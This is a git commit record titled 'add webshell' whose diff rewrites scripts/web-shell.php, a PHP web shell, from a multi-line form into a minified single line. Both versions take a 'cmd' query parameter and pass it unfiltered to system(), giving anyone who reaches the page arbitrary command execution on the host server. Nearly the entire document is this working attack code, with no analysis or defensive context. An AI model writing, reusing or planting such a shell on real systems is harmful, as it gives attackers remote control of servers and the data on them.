8e15ecc79b7c6d5ff84c1cd273c3c3d0554c0509
owalid <othmane.el.ayadi@gmail.com>
2021-11-08 21:44:03 +0100

    add webshell

--- scripts/web-shell.php
+++ scripts/web-shell.php
@@ -1,8 +1,1 @@
-<form action='file.php' method='GET'>
-  <input type='text' name='cmd' autofocus style="width:400px; height:400px;"/>
-  <br />
-  <?php
-  $cmd=$_GET['cmd'];
-  system($cmd);
-  ?>
-</form>
+<form action='file.php'><input autofocus name='cmd'style='width:400px;height:400px'><br><?php $cmd=$_GET['cmd'];system($cmd); ?></form>
